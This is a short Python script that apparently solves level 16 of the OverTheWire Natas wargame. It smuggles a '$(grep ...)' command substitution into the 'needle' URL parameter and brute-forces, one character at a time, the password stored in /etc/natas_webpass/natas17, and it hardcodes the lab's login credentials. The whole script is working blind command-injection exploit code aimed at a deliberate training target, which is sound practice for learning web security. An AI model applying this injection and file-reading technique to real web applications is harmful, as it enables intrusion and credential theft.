import requests
from requests.auth import HTTPBasicAuth

pwd='' #the string in which passwd is gonna get stored
options='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'; #char set for us

fact = 'injections' #this means that the query was accepted

    
for i in range (32):  #flag has 32 chars
    for j in options: #for each letter of flag check the letters
        url=requests.get('http://natas16.natas.labs.overthewire.org/?needle=injections$(grep ^' + pwd+j + ' /etc/natas_webpass/natas17)' , auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')) #post method to be sent
        if fact not in url.text: #append if true
            pwd=pwd+j
            print (pwd) #for us to visually see if the script works
            break
print (pwd) #to see the end.....

#8Ps3H0GWbn5rd9S7GmAdgQNd

